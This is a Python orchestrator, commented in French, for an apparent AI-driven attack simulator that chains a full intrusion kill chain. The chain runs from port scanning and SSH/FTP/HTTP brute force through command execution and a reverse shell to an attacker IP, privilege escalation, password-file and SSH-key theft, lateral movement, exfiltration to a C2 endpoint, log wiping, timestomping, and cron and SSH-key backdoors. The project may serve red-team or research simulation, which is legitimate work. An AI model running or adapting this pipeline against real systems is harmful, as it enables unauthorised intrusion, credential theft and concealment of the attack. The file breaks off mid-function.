#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Tue May 19 17:59:24 2026

@author: hounsousamuel
"""
import os
import sys
sys.path.insert(1, os.path.dirname(os.path.abspath(os.path.join(__file__, "..", ".."))))

import asyncio
import random
import json
from datetime import datetime, timezone
from enum import Enum
from typing import List, Dict, Tuple, Any

from simulateur_attaque_ia.tactics.reconnaissance import NetworkServiceDiscover
from simulateur_attaque_ia.tactics.initial_access import FTPBruteForce, HTTPBruteForce, SSHBruteForce
from simulateur_attaque_ia.tactics.execution import CommandExecution, PythonExecution, ReverseShell
from simulateur_attaque_ia.tactics.persistence import CronBackdoor, SSHKeyBackdoor
from simulateur_attaque_ia.tactics.credential_access import (
    PasswordFileDump, BashHistoryRead, SSHKeyTheft
)
from simulateur_attaque_ia.tactics.lateral_movement import SSHLateralMovement
from simulateur_attaque_ia.tactics.exfiltration import ExfiltrationHTTP
from simulateur_attaque_ia.tactics.defense_evasion import (
    LogCleaner, Timestomp
)
from simulateur_attaque_ia.tactics.privilege_escalation import (
    SUIDBinary, SudoExploit
)
from simulateur_attaque_ia.orchestrator.prompts import build_prompt
from simulateur_attaque_ia.orchestrator.actions import ALL_ACTIONS, ACTIONS_MAPPING
from simulateur_attaque_ia.configs.config import REPORT_DIR

class SimulatorStep(str, Enum):
    """Étapes du simulateur — hérite de str pour compatibilité avec LangGraph et logs"""
    RECONNAISSANCE = "Reconnaissance"
    INITIAL_ACCESS = "InitialAccess"
    EXECUTION      = "Execution"
    PRIVILEGE_ESCALATION = "PrivilegeEscalation" 
    CREDENTIAL_ACCESS  = "CredentialAccess"       
    LATERAL_MOVEMENT   = "LateralMovement"        
    EXFILTRATION       = "Exfiltration"           
    DEFENSE_EVASION    = "DefenseEvasion"         
    PERSISTENCE        = "Persistence"
    REPORT             = "Report"
    

async def exec_coro(name: str, coro):
    """
    Exécute une coroutine et capture son résultat ou son exception.
    
    Args:
        name (str): Nom identifiant la coroutine pour le résultat retourné
        coro: Coroutine à exécuter (généralement une asyncio.Task ou coroutine)
    
    Returns:
        tuple: (name, result, is_exception)
            - name: le nom passé en argument
            - result: résultat de la coroutine ou message d'erreur
            - is_exception: booléen indiquant si une exception a été levée
    """
    try:
        r = await coro
        return name, r, False
    except Exception as e:
        return name, str(e), True


async def graph_entry_point(state: Dict[str, Any]) -> Dict[str, Any]:
    """
    Nœud de reconnaissance : scan des ports et collecte des bannières.
    
    Effectue un scan des ports sur l'IP cible dans la plage spécifiée,
    identifie les services ouverts (SSH, FTP, HTTP) et enrichit l'état
    avec les ports ouverts et leur mapping par fonction.
    
    Args:
        state (Dict[str, Any]): État courant du simulateur contenant au minimum:
            - ip: IP cible
            - network_discover_port_range: plage de ports à scanner
            - network_discover_timeout_socket: timeout socket
    
    Returns:
        Dict[str, Any]: État mis à jour avec:
            - open_ports: liste des ports ouverts
            - port_function: mapping service -> ports
            - steps_results: résultats du scan
            - success_dict: succès/échec de l'étape
            - error_dict: erreurs éventuelles
    """
    # Initialisation sécurisée des dictionnaires
    state.setdefault("steps_results", {})
    state.setdefault("success_dict", {})
    state.setdefault("error_dict", {})
    state.setdefault("actual_action", [])
    state.setdefault("already_done", [])
    state.setdefault("pivot_errors", [])
    state.setdefault("open_ports", [])
    state.setdefault("port_function", {})
    
    try:
        state["actual_step"] = SimulatorStep.RECONNAISSANCE.value
        state["actual_action"] = ["NetworkServiceDiscover"]
        network_discover = NetworkServiceDiscover(timeout_socket=state["network_discover_timeout_socket"])
        ip = state["ip"]
        port_range = [p for p in state["network_discover_port_range"] if 0 <= p <= 65535]
        n_result = await network_discover.scan_async(
            ip=ip,
            port_range=port_range
        )
        open_ports = n_result["results"]["open_ports"]
        state["steps_results"]["NetworkServiceDiscover|Reconnaissance"] = [n_result]
        state["open_ports"] = open_ports
        state["success_dict"]["NetworkServiceDiscover|Reconnaissance"] = True
        if open_ports:
            results = n_result["results"]["scan_result"]
            port_function = {
                function: [port for port in open_ports if function in results[port]["service"].lower()]
                for function in ["ssh", "ftp", "http"]
            }
            state["port_function"] = port_function
        
    except Exception as e:
        state["success_dict"]["NetworkServiceDiscover|Reconnaissance"] = False
        if "NetworkServiceDiscover|Reconnaissance" in state["error_dict"]:
            state["error_dict"]["NetworkServiceDiscover|Reconnaissance"].append(str(e))
        else:
            state["error_dict"]["NetworkServiceDiscover|Reconnaissance"] = [str(e)]
        
    return state


async def graph_initial_access(state: Dict[str, Any]) -> Dict[str, Any]:
    """
    Nœud d'accès initial : brute force SSH, FTP et HTTP.
    
    Utilise les ports découverts lors de la reconnaissance pour lancer
    des attaques par force brute sur les services SSH, FTP et HTTP.
    Les identifiants trouvés sont stockés dans l'état.
    
    Args:
        state (Dict[str, Any]): État courant contenant:
            - port_function: mapping service -> ports
            - ip: IP cible
            - paramètres de configuration pour chaque brute force
    
    Returns:
        Dict[str, Any]: État mis à jour avec:
            - *_found_credentials: identifiants trouvés par service
            - steps_results: résultats détaillés
            - success_dict: succès/échec par étape
            - error_dict: erreurs éventuelles
    """
    # Initialisation sécurisée des dictionnaires
    state.setdefault("steps_results", {})
    state.setdefault("success_dict", {})
    state.setdefault("error_dict", {})
    state.setdefault("actual_action", [])
    state.setdefault("already_done", [])
    state.setdefault("pivot_errors", [])
    state.setdefault("ssh_brute_force_found_credentials", {})
    state.setdefault("ftp_brute_force_found_credentials", {})
    state.setdefault("http_brute_force_found_credentials", {})
    
    try:
        state["actual_step"] = SimulatorStep.INITIAL_ACCESS.value
        port_function = state["port_function"]
        ip = state["ip"]
        ssh_port = port_function["ssh"]
        ftp_port = port_function["ftp"]
        http_port = port_function["http"]
        tasks = []
        ssh_manager = None
        ftp_manager = None
        http_manager = None
        
        # Créer les tasks asynchrones
        if ssh_port:
            state["actual_action"].append("SSHBruteForce")
            ssh_manager = SSHBruteForce(
                timeout=state["ssh_brute_force_timeout"],
                total_timeout=state["ssh_brute_force_total_timeout"],
                delay=state["ssh_brute_force_delay"],
                max_attempts=state["ssh_brute_force_max_attempts"],
            )
            for port in ssh_port:
                name = f"ssh_brute_force|{port}"
                coro = asyncio.create_task(
                        ssh_manager.find_all_async(
                        ip=ip,
                        port=port,
                        usernames=state["ssh_brute_force_usernames"],
                        passwords=state["ssh_brute_force_passwords"]
                    ),
                        name=f"{name}_async_task"
                )
                tasks.append(
                    exec_coro(name, coro)
                )
            
        if ftp_port:
            state["actual_action"].append("FTPBruteForce")
            ftp_manager = FTPBruteForce(
                timeout=state["ftp_brute_force_timeout"],
                total_timeout=state["ftp_brute_force_total_timeout"],
                max_attempts=state["ftp_brute_force_max_attempts"],
            )
            for port in ftp_port:
                name = f"ftp_brute_force|{port}"
                coro = asyncio.create_task(
                        ftp_manager.find_all_async(
                        ip=ip,
                        port=port,
                        usernames=state["ftp_brute_force_usernames"],
                        passwords=state["ftp_brute_force_passwords"]
                    ),
                        name=f"{name}_async_task"
                )
                tasks.append(
                    exec_coro(name, coro)
                )
            
        if http_port:
            state["actual_action"].append("HTTPBruteForce")
            http_manager = HTTPBruteForce(
                timeout=state["http_brute_force_timeout"],
                preference=state["http_brute_force_preference"],
            )
            for port in http_port:
                name = f"http_brute_force|{port}"
                coro = asyncio.create_task(
                        http_manager.find_all_async(
                        url=ip,
                        port=port,
                        paths=state["http_brute_force_paths"],
                        add_common=state["http_brute_force_add_common"],
                    ),
                        name=f"{name}_async_task"
                )
                tasks.append(
                    exec_coro(name, coro)
                )
        
        if tasks:
            # Attendre les résultats
            results_list = await asyncio.gather(
                *tasks, return_exceptions=True
            )
            found_results = {
                "ssh_brute_force": {},
                "ftp_brute_force": {},
                "http_brute_force": {},
            }
            
            all_results = {
                "ssh_brute_force": [],
                "ftp_brute_force": [],
                "http_brute_force": [],
            }
            
            error_dict = {
                "ssh_brute_force": [],
                "ftp_brute_force": [],
                "http_brute_force": [],
            }
            for name, coro_result, is_exception in results_list:
                base_name, port = name.split("|")
                if not is_exception:
                    # Format des résults uniforme
                    found_results[base_name][port] = coro_result["results"]["founds"]
                    all_results[base_name].append({"result": coro_result, "port": port, "ip": ip})
                else:
                    key = base_name.replace("_", " ").title().replace(" ", "")
                    key = f"{key}|InitialAccess"
                    if key in state["error_dict"]:
                        state["error_dict"][key].append(coro_result)
                    else:
                        state["error_dict"][key] = [coro_result]
                
                error_dict[base_name].append(not is_exception)
            
            for k, v in error_dict.items():
                key = k.replace("_", " ").title().replace(" ", "")
                key = f"{key}|InitialAccess"
                state["success_dict"][key] = all(v)
            
            for k, v in found_results.items():
                state[f"{k}_found_credentials"] = v
            
            for k, v in all_results.items():
                key = k.replace("_", " ").title().replace(" ", "")
                key = f"{key}|InitialAccess"
                state["steps_results"][key] = v
            
            
    except Exception as e:
        for k in ("SSHBruteForce", "FTPBruteForce", "HTTPBruteForce"):
            key = f"{k}|InitialAccess"
            if key in state["error_dict"]:
                state["error_dict"][key].append(str(e))
            else:
                state["error_dict"][key] = [str(e)]
            state["success_dict"][key] = False
        
    return state


async def graph_execution(state: Dict[str, Any]) -> Dict[str, Any]:
    """
    Nœud d'exécution : commandes shell, scripts Python et reverse shell.
    
    Utilise les identifiants SSH trouvés pour exécuter des commandes système,
    des scripts Python et éventuellement établir un reverse shell.
    
    Args:
        state (Dict[str, Any]): État courant contenant:
            - ssh_brute_force_found_credentials: identifiants SSH trouvés
            - ip: IP cible
            - paramètres d'exécution (timeouts, commandes, etc.)
    
    Returns:
        Dict[str, Any]: État mis à jour avec:
            - steps_results: résultats des exécutions
            - success_dict: succès/échec par étape
            - error_dict: erreurs éventuelles
    """
    # Initialisation sécurisée des dictionnaires
    state.setdefault("steps_results", {})
    state.setdefault("success_dict", {})
    state.setdefault("error_dict", {})
    state.setdefault("actual_action", [])
    state.setdefault("already_done", [])
    state.setdefault("pivot_errors", [])
    
    try:
        state["actual_step"] = SimulatorStep.EXECUTION.value
        ip = state["ip"]
        tasks = []
        
        ssh_credentials = state.get("ssh_brute_force_found_credentials", {})
        
        cmd_manager = None
        py_manager = None
        
        if ssh_credentials:
            state["actual_action"].append("CommandExecution")
            state["actual_action"].append("PythonExecution")
            
            cmd_manager = CommandExecution(
                timeout=state.get("command_execution_timeout", 2),
                exec_timeout=state.get("command_execution_exec_timeout", 5),
            )
            py_manager = PythonExecution(
                timeout=state.get("python_execution_timeout", 2),
                exec_timeout=state.get("python_execution_exec_timeout", 5),
            )
            
            for port, creds_list in ssh_credentials.items():
                for cred in creds_list:
                    username = cred.get("username")
                    password = cred.get("password")
                    if not username or not password:
                        continue
                    
                    # CommandExecution
                    name_cmd = f"command_execution|{port}"
                    coro_cmd = asyncio.create_task(
                        cmd_manager.exec_command_async(
                            ip=ip,
                            port=int(port),
                            username=username,
                            password=password,
                            commands=state.get("command_execution_commands", []),
                            add_common=state.get("command_execution_add_common", True),
                            quick=state.get("command_execution_quick", True),
                        ),
                        name=f"{name_cmd}_async_task"
                    )
                    tasks.append(exec_coro(name_cmd, coro_cmd))
                    
                    # PythonExecution
                    name_py = f"python_execution|{port}"
                    coro_py = asyncio.create_task(
                        py_manager.exec_command_async(
                            ip=ip,
                            port=int(port),
                            username=username,
                            password=password,
                            python_commands=state.get("python_execution_commands", []),
                            add_common=state.get("python_execution_add_common", True),
                            quick=state.get("python_execution_quick", True),
                        ),
                        name=f"{name_py}_async_task"
                    )
                    tasks.append(exec_coro(name_py, coro_py))
            
            # ReverseShell — un seul credential choisi au hasard
            all_creds = [
                (port, cred)
                for port, creds_list in ssh_credentials.items()
                for cred in creds_list
                if cred.get("username") and cred.get("password")
            ]
            
            if all_creds and state.get("reverse_shell_attaquant_ip"):
                state["actual_action"].append("ReverseShell")
                port, cred = random.choice(all_creds)
                
                rs_manager = ReverseShell(
                    timeout=state.get("reverse_shell_timeout", 2),
                    exec_timeout=state.get("reverse_shell_exec_timeout", 100),
                )
                name_rs = f"reverse_shell|{port}"
                coro_rs = asyncio.create_task(
                    rs_manager.reverse_async(
                        ip=ip,
                        port=int(port),
                        attaquant_ip=state["reverse_shell_attaquant_ip"],
                        attaquant_port=state.get("reverse_shell_attaquant_port", 4444),
                        username=cred["username"],
                        password=cred["password"],
                        commands=state.get("reverse_shell_commands", []),
                        timeout=state.get("reverse_shell_listener_timeout", 30),
                        total_timeout=state.get("reverse_shell_total_timeout", 60),
                    ),
                    name=f"{name_rs}_async_task"
                )
                tasks.append(exec_coro(name_rs, coro_rs))
        
        if tasks:
            results_list = await asyncio.gather(*tasks, return_exceptions=True)
            
            all_results = {
                "command_execution": [],
                "python_execution": [],
                "reverse_shell": [],
            }
            error_dict = {
                "command_execution": [],
                "python_execution": [],
                "reverse_shell": [],
            }
            
            for name, coro_result, is_exception in results_list:
                base_name, port = name.split("|")
                if not is_exception:
                    all_results[base_name].append({
                        "result": coro_result,
                        "port": port,
                        "ip": ip
                    })
                else:
                    key = f"{base_name.replace('_', ' ').title().replace(' ', '')}|Execution"
                    state["error_dict"].setdefault(key, []).append(coro_result)
                
                error_dict[base_name].append(not is_exception)
            
            for k, v in error_dict.items():
                key = f"{k.replace('_', ' ').title().replace(' ', '')}|Execution"
                state["success_dict"][key] = all(v)
            
            for k, v in all_results.items():
                key = f"{k.replace('_', ' ').title().replace(' ', '')}|Execution"
                state["steps_results"][key] = v
    
    except Exception as e:
        for k in ("CommandExecution", "PythonExecution", "ReverseShell"):
            key = f"{k}|Execution"
            state["error_dict"].setdefault(key, []).append(str(e))
            state["success_dict"][key] = False
    
    return state


async def graph_persistence(state: Dict[str, Any]) -> Dict[str, Any]:
    """
    Nœud de persistance : backdoor cron et injection de clé SSH.
    
    Installe des mécanismes de persistance sur la cible :
    - Injection de clé SSH pour accès futur
    - Backdoor cron pour exécution périodique de scripts
    
    Args:
        state (Dict[str, Any]): État courant contenant:
            - ssh_brute_force_found_credentials: identifiants SSH trouvés
            - ip: IP cible
            - dock_manager: gestionnaire Docker (injecté par le wrapper)
            - paramètres de configuration (chemins, expressions cron, etc.)
    
    Returns:
        Dict[str, Any]: État mis à jour avec:
            - steps_results: résultats des installations
            - success_dict: succès/échec par étape
            - error_dict: erreurs éventuelles
    """
    # Initialisation sécurisée des dictionnaires
    state.setdefault("steps_results", {})
    state.setdefault("success_dict", {})
    state.setdefault("error_dict", {})
    state.setdefault("actual_action", [])
    state.setdefault("already_done", [])
    state.setdefault("pivot_errors", [])
    state.setdefault("created_files", []).append(state.get("cron_script_path", "/opt/backdoor.sh"))
    state.setdefault("created_files", []).append("/root/.ssh/authorized_keys")
    
    try:
        state["actual_step"] = SimulatorStep.PERSISTENCE.value
        ip = state["ip"]
        tasks = []
        
        ssh_credentials = state.get("ssh_brute_force_found_credentials", {})
        
        cron_manager = CronBackdoor()
        ssh_key_manager = None
        
        if ssh_credentials:
            state["actual_action"].append("CronBackdoor")
            state["actual_action"].append("SshKeyBackdoor")
            
            ssh_key_manager = SSHKeyBackdoor(
                timeout=state.get("ssh_key_timeout", 2),
                exec_timeout=state.get("ssh_key_exec_timeout", 5),
            )
            
            for port, creds_list in ssh_credentials.items():
                for cred in creds_list:
                    username = cred.get("username")
                    password = cred.get("password")
                    if not username or not password:
                        continue
                    
                    # SSHKeyBackdoor
                    name_key = f"ssh_key_backdoor|{port}"
                    coro_key = asyncio.create_task(
                        ssh_key_manager.inject_key_async(
                            ip=ip,
                            port=int(port),
                            username=username,
                            password=password,
                            algo=state.get("ssh_key_algo", "RSA"),
                        ),
                        name=f"{name_key}_async_task"
                    )
                    tasks.append(exec_coro(name_key, coro_key))
        
        # CronBackdoor utilise DockerManager directement
        dock = state.get("dock_manager")
        if dock:
            state["actual_action"].append("CronBackdoor")
            name_cron = "cron_backdoor|docker"
            coro_cron = asyncio.create_task(
                asyncio.to_thread(
                    cron_manager.cron_inject,
                    dock,
                    state.get("cron_script_path", "/opt/system.sh"),
                    state.get("cron_expression", "*/5 * * * *"),
                    None,
                    state.get("cron_level", "simple"),
                ),
                name=f"{name_cron}_async_task"
            )
            tasks.append(exec_coro(name_cron, coro_cron))
        
        if tasks:
            results_list = await asyncio.gather(*tasks, return_exceptions=True)
            
            all_results = {
                "ssh_key_backdoor": [],
                "cron_backdoor": [],
            }
            error_dict = {
                "ssh_key_backdoor": [],
                "cron_backdoor": [],
            }
            
            for name, coro_result, is_exception in results_list:
                parts = name.split("|")
                if len(parts) == 2:
                    base_name, port = parts
                else:
                    base_name, port = parts[0], "docker"
                    
                if not is_exception:
                    all_results[base_name].append({
                        "result": coro_result,
                        "port": port,
                        "ip": ip
                    })
                else:
                    key = f"{base_name.replace('_', ' ').title().replace(' ', '')}|Persistence"
                    state["error_dict"].setdefault(key, []).append(coro_result)
                
                error_dict[base_name].append(not is_exception)
            
            for k, v in error_dict.items():
                key = f"{k.replace('_', ' ').title().replace(' ', '')}|Persistence"
                state["success_dict"][key] = all(v)
            
            for k, v in all_results.items():
                key = f"{k.replace('_', ' ').title().replace(' ', '')}|Persistence"
                state["steps_results"][key] = v
    
    except Exception as e:
        for k in ("SshKeyBackdoor", "CronBackdoor"):
            key = f"{k}|Persistence"
            state["error_dict"].setdefault(key, []).append(str(e))
            state["success_dict"][key] = False
    
    return state

async def graph_privilege_escalation(state: Dict[str, Any]) -> Dict[str, Any]:
    """
    Nœud d'élévation de privilèges.

    Exécute SudoExploit et SUIDBinary en parallèle pour tenter d'obtenir
    des privilèges root via des configurations sudo NOPASSWD ou des binaires SUID.

    Args:
        state: État courant du simulateur contenant les credentials SSH.

    Returns:
        État enrichi avec les résultats des exploits et un flag de succès.
    """
    state.setdefault("steps_results", {})
    state.setdefault("success_dict", {})
    state.setdefault("error_dict", {})
    state.setdefault("privilege_escalation_results", {})

    try:
        state["actual_step"] = SimulatorStep.PRIVILEGE_ESCALATION.value
        state["actual_action"] = ["SudoExploit", "SUIDBinary"]

        ip       = state["ip"]
        ssh_creds = state.get("ssh_brute_force_found_credentials", {})
        first_port = next(iter(ssh_creds))
        first_cred = ssh_creds[first_port][0]
        username   = first_cred["username"]
        password   = first_cred["password"]
        port       = int(first_port)

        timeout      = state.get("privilege_escalation_timeout", 2)
        exec_timeout = state.get("privilege_escalation_exec_timeout", 10)

        sudo  = SudoExploit(timeout=timeout, exec_timeout=exec_timeout)
        suid  = SUIDBinary(timeout=timeout, exec_timeout=exec_timeout)

        # Lancer en parallèle
        sudo_result, suid_result = await asyncio.gather(
            sudo.exploit_async(ip=ip, port=port, username=username, password=password),
            suid.exploit_async(ip=ip, port=port, username=username, password=password),
            return_exceptions=True,
        )

        state["privilege_escalation_results"] = {
            "sudo_exploit": sudo_result if not isinstance(sudo_result, Exception) else {},
            "suid_binary":  suid_result if not isinstance(suid_result, Exception) else {},
        }

        # Privilege escalation réussie si au moins un exploit a marché
        sudo_success = not isinstance(sudo_result, Exception) and \
                       sudo_result.get("results", {}).get("success_number", 0) > 0
        suid_success = not isinstance(suid_result, Exception) and \
                       suid_result.get("results", {}).get("success_number", 0) > 0

        state["privilege_escalation_success"] = sudo_success or suid_success

        for name, result, success in [
            ("SudoExploit", sudo_result, sudo_success),
            ("SUIDBinary",  suid_result, suid_success),
        ]:
            key = f"{name}|PrivilegeEscalation"
            state["success_dict"][key] = success
            state["steps_results"][key] = [{"result": result if not isinstance(result, Exception) else {}, "port": port, "ip": ip}]

    except Exception as e:
        for name in ("SudoExploit", "SUIDBinary"):
            state["error_dict"].setdefault(f"{name}|PrivilegeEscalation", []).append(str(e))
            state["success_dict"][f"{name}|PrivilegeEscalation"] = False
        state["privilege_escalation_success"] = False

    return state


async def graph_credential_access(state: Dict[str, Any]) -> Dict[str, Any]:
    """
    Nœud d'accès aux identifiants.

    Exécute PasswordFileDump, BashHistoryRead et SSHKeyTheft en parallèle.
    Les clés SSH et known_hosts récupérés sont stockés pour le mouvement latéral.

    Args:
        state: État courant contenant les credentials SSH.

    Returns:
        État enrichi avec les résultats des vols et les données pour lateral movement.
    """
    state.setdefault("steps_results", {})
    state.setdefault("success_dict", {})
    state.setdefault("error_dict", {})
    state.setdefault("credential_access_results", {})
    state.setdefault("lateral_movement_usable_keys", [])
    state.setdefault("lateral_movement_known_hosts", [])

    try:
        state["actual_step"] = SimulatorStep.CREDENTIAL_ACCESS.value
        state["actual_action"] = ["PasswordFileDump", "BashHistoryRead", "SSHKeyTheft"]

        ip        = state["ip"]
        ssh_creds = state.get("ssh_brute_force_found_credentials", {})
        first_port = next(iter(ssh_creds))
        first_cred = ssh_creds[first_port][0]
        username   = first_cred["username"]
        password   = first_cred["password"]
        port       = int(first_port)

        timeout      = state.get("credential_access_timeout", 2)
        exec_timeout = state.get("credential_access_exec_timeout", 10)

        dumper = PasswordFileDump(timeout=timeout, exec_timeout=exec_timeout)
        reader = BashHistoryRead(timeout=timeout, exec_timeout=exec_timeout)
        stoler = SSHKeyTheft(timeout=timeout, exec_timeout=exec_timeout)

        dump_result, read_result, steal_result = await asyncio.gather(
            dumper.dump_async(ip=ip, port=port, username=username, password=password),
            reader.read_async(ip=ip, port=port, username=username, password=password),
            stoler.steal_async(ip=ip, port=port, username=username, password=password),
            return_exceptions=True,
        )

        state["credential_access_results"] = {
            "password_file_dump": dump_result  if not isinstance(dump_result,  Exception) else {},
            "bash_history_read":  read_result  if not isinstance(read_result,  Exception) else {},
            "ssh_key_theft":      steal_result if not isinstance(steal_result, Exception) else {},
        }

        # Alimenter le lateral movement
        steal_data = state["credential_access_results"]["ssh_key_theft"].get("results", {})
        state["lateral_movement_usable_keys"] = steal_data.get("usable_keys", [])
        state["lateral_movement_known_hosts"] = steal_data.get("known_hosts", [])

        for name, result in zip(
            ["PasswordFileDump", "BashHistoryRead", "SSHKeyTheft"],
            [dump_result, read_result, steal_result]
        ):
            key     = f"{name}|CredentialAccess"
            is_ok   = not isinstance(result, Exception)
            state["success_dict"][key]  = is_ok
            state["steps_results"][key] = [{"result": result if is_ok else {}, "port": port, "ip": ip}]

    except Exception as e:
        for name in ("PasswordFileDump", "BashHistoryRead", "SSHKeyTheft"):
            state["error_dict"].setdefault(f"{name}|CredentialAccess", []).append(str(e))
            state["success_dict"][f"{name}|CredentialAccess"] = False

    return state


async def graph_lateral_movement(state: Dict[str, Any]) -> Dict[str, Any]:
    """
    Nœud de mouvement latéral.

    Utilise les clés SSH volées et les known_hosts pour se propager à d'autres
    machines via un algorithme BFS. Technique MITRE T1021.004.

    Args:
        state: État contenant les clés et hôtes issus de credential_access.

    Returns:
        État enrichi avec les résultats de la propagation.
    """
    state.setdefault("steps_results", {})
    state.setdefault("success_dict", {})
    state.setdefault("error_dict", {})
    state.setdefault("lateral_movement_results", {})

    try:
        state["actual_step"] = SimulatorStep.LATERAL_MOVEMENT.value
        state["actual_action"] = ["SSHLateralMovement"]

        usable_keys = state.get("lateral_movement_usable_keys", [])
        known_hosts  = state.get("lateral_movement_known_hosts", [])

        if not usable_keys or not known_hosts:
            state["success_dict"]["SSHLateralMovement|LateralMovement"] = False
            return state

        lateral = SSHLateralMovement(
            timeout=state.get("credential_access_timeout", 2),
            exec_timeout=state.get("credential_access_exec_timeout", 10),
            max_depth=state.get("lateral_movement_max_depth", 3),
            max_workers=state.get("lateral_movement_max_workers", 5),
            join_timeout=state.get("lateral_movement_join_timeout", 60.0),
        )

        result = await lateral.propagate_async(
            usable_keys=usable_keys,
            known_hosts=known_hosts,
        )

        state["lateral_movement_results"] = result
        compromised_count = result.get("results", {}).get("compromised_count", 0)
        state["success_dict"]["SSHLateralMovement|LateralMovement"] = compromised_count > 0
        state["steps_results"]["SSHLateralMovement|LateralMovement"] = [
            {"result": result, "ip": state["ip"]}
        ]

    except Exception as e:
        state["error_dict"].setdefault("SSHLateralMovement|LateralMovement", []).append(str(e))
        state["success_dict"]["SSHLateralMovement|LateralMovement"] = False

    return state


async def graph_exfiltration(state: Dict[str, Any]) -> Dict[str, Any]:
    """
    Nœud d'exfiltration.

    Envoie les données collectées (credentials, clés, logs) vers un serveur C2
    via HTTP POST. Technique MITRE T1041.

    Args:
        state: État contenant les résultats des phases précédentes.

    Returns:
        État enrichi avec les résultats de l'exfiltration.
    """
    state.setdefault("steps_results", {})
    state.setdefault("success_dict", {})
    state.setdefault("error_dict", {})
    state.setdefault("exfiltration_results", {})

    try:
        state["actual_step"] = SimulatorStep.EXFILTRATION.value
        state["actual_action"] = ["ExfiltrationHTTP"]

        tactic_results = state.get("credential_access_results", {})

        exfil = ExfiltrationHTTP(
            c2_url=state.get("exfiltration_c2_url", "http://127.0.0.1:8888/exfil"),
            timeout=state.get("exfiltration_timeout", 10),
        )

        result = await exfil.exfil_async(
            target_ip=state["ip"],
            tactic_results=tactic_results,
        )

        state["exfiltration_results"] = result
        sent = result.get("results", {}).get("sent_count", 0)
        state["success_dict"]["ExfiltrationHTTP|Exfiltration"] = sent > 0
        state["steps_results"]["ExfiltrationHTTP|Exfiltration"] = [
            {"result": result, "ip": state["ip"]}
        ]

    except Exception as e:
        state["error_dict"].setdefault("ExfiltrationHTTP|Exfiltration", []).append(str(e))
        state["success_dict"]["ExfiltrationHTTP|Exfiltration"] = False

    return state


async def graph_defense_evasion(state: Dict[str, Any]) -> Dict[str, Any]:
    """
    Nœud d'évasion de défense.

    Nettoie les logs système et modifie les timestamps pour effacer les traces.
    Techniques MITRE T1070.002 (Log Cleaning) et T1070.006 (Timestomp).

    Args:
        state: État courant contenant les credentials SSH.

    Returns:
        État enrichi avec les résultats du nettoyage.
    """
    state.setdefault("steps_results", {})
    state.setdefault("success_dict", {})
    state.setdefault("error_dict", {})
    state.setdefault("defense_evasion_results", {})

    try:
        state["actual_step"] = SimulatorStep.DEFENSE_EVASION.value
        state["actual_action"] = ["LogCleaner", "Timestomp"]

        ip        = state["ip"]
        ssh_creds = state.get("ssh_brute_force_found_credentials", {})
        first_port = next(iter(ssh_creds))
        first_cred = ssh_creds[first_port][0]
        username   = first_cred["username"]
        password   = first_cred["password"]
        port       = int(first_port)

        timeout      = state.get("defense_evasion_timeout", 2)
        exec_timeout = state.get("defense_evasion_exec_timeout", 10)

        cleaner  = LogCleaner(timeout=timeout, exec_timeout=exec_timeout)
        timestomp = Timestomp(timeout=timeout, exec_timeout=exec_timeout)

        # Récupérer les fichiers créés par les autres nodes
        created_files = state.get("created_files", [])
        
        # Lancer en parallèle
        stomp_tasks = [
            timestomp.timestomp_to_another_file(
                ip=ip, port=port, username=username, password=password,
                source="/bin/bash",   # date ancienne + crédible
                target=f,
            )
            for f in created_files
        ] if created_files else []
        
        clean_result, *stomp_results = await asyncio.gather(
            cleaner.clean_async(ip=ip, port=port, username=username, password=password),
            *stomp_tasks,
            return_exceptions=True,
        )
        
        stomp_result = stomp_results[0] if stomp_results else {}
        
        state["defense_evasion_results"] = {
            "log_cleaner": clean_result  if not isinstance(clean_result,  Exception) else {},
            "timestomp":   stomp_result  if not isinstance(stomp_result,  Exception) else {},
            "files_stomped": created_files,
        }

        for name, result in zip(
            ["LogCleaner", "Timestomp"],
            [clean_result, stomp_result]
        ):
            key   = f"{name}|DefenseEvasion"
            is_ok = not isinstance(result, Exception)
            state["success_dict"][key]  = is_ok
            state["steps_results"][key] = [{"result": result if is_ok else {}, "port": port, "ip": ip}]

    except Exception as e:
        for name in ("LogCleaner", "Timestomp"):
            state["error_dict"].setdefault(f"{name}|DefenseEvasion", []).append(str(e))
            state["success_dict"][f"{name}|DefenseEvasion"] = False

    return state

def graph_conditional_edge(state: Dict[str, Any]) -> str:
    """
    Détermine la prochaine étape du graphe d'attaque.

    Orchestration complète du kill chain :
        Reconnaissance → Initial Access → Execution → Privilege Escalation
        → Credential Access → (Lateral Movement si possible) → Exfiltration
        → Defense Evasion → Persistence → Report → End

    Args:
        state: État courant avec actual_step, success_dict, already_done.

    Returns:
        Nom du prochain nœud (initial_access, execution, privilege_escalation,
        credential_access, lateral_movement, exfiltration, defense_evasion,
        persistence, report, end).
    """
    state.setdefault("success_dict", {})
    state.setdefault("already_done", [])
    state.setdefault("pivot_errors", [])
    state.setdefault("ssh_brute_force_found_credentials", {})

    try:
        actual_action = state.get("actual_action", [])
        actual_step   = state.get("actual_step", "")

        # =====================================================================
        # Recon
        # =====================================================================
        if "NetworkServiceDiscover" in actual_action and actual_step == SimulatorStep.RECONNAISSANCE:
            success = state["success_dict"].get("NetworkServiceDiscover|Reconnaissance", False)
            if success and state.get("open_ports"):
                state["already_done"].append(SimulatorStep.RECONNAISSANCE.value)
                return "initial_access"
            return "end"

        # =====================================================================
        # Initial Access
        # =====================================================================
        if actual_step == SimulatorStep.INITIAL_ACCESS:
            state["already_done"].append(SimulatorStep.INITIAL_ACCESS.value)
            ssh_creds = state.get("ssh_brute_force_found_credentials", {})
            if ssh_creds:
                return "execution"
            # Pas de creds SSH → persistence directe
            return "persistence" if SimulatorStep.PERSISTENCE not in state["already_done"] else "report"

        # =====================================================================
        # Execution → toujours PrivEsc
        # =====================================================================
        if actual_step == SimulatorStep.EXECUTION:
            state["already_done"].append(SimulatorStep.EXECUTION.value)
            return "privilege_escalation"

        # =====================================================================
        # Privilege Escalation → toujours Credential Access
        # (peu importe si réussie ou non — on essaie avec ce qu'on a)
        # =====================================================================
        if actual_step == SimulatorStep.PRIVILEGE_ESCALATION:
            state["already_done"].append(SimulatorStep.PRIVILEGE_ESCALATION.value)
            return "credential_access"

        # =====================================================================
        # Credential Access
        # Si clés volées + known_hosts → Lateral Movement
        # Sinon → Exfiltration directe
        # =====================================================================
        if actual_step == SimulatorStep.CREDENTIAL_ACCESS:
            state["already_done"].append(SimulatorStep.CREDENTIAL_ACCESS.value)
            usable_keys = state.get("lateral_movement_usable_keys", [])
            known_hosts  = state.get("lateral_movement_known_hosts", [])
            if usable_keys and known_hosts:
                return "lateral_movement"
            return "exfiltration"

        # =====================================================================
        # Lateral Movement → toujours Exfiltration
